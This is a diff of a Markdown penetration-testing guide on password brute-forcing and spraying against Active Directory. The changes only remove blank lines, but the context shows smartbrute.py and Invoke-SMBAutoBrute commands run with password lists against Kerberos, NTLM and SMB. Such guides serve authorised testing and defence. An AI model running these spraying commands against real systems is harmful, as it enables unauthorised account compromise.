@@ -26,8 +26,6 @@ Kerberos pre-authentication errors are not logged in Active Directory with a nor
 
 {% embed url="https://github.com/ropnop/kerbrute" %}
 
-****
-
 ### Username bruteforce
 
 ```
@@ -58,8 +56,6 @@ smartbrute.py brute -bU $USER_LIST -bP $PASSWORD_LIST kerberos -d $DOMAIN
 smartbrute.py smart -bP $PASSWORD_LIST ntlm -d $DOMAIN -u $USER -p $PASSWORD kerberos
 ```
 
-
-
 ### **​​Spray a pre-generated passwords list**
 
 Using `crackmapexec` and `mp64` to generate passwords and spray them against SMB services on the network.
@@ -82,8 +78,6 @@ Using `SMBAutoBrute`.
 ```
 Invoke-SMBAutoBrute -UserList "C:\ProgramData\admins.txt" -PasswordList "Password1, Welcome1, 1qazXDR%+" -LockoutThreshold 5 -ShowVerbose
 ```
-
-****
 
 ### **Spray passwords against the RDP service**
 
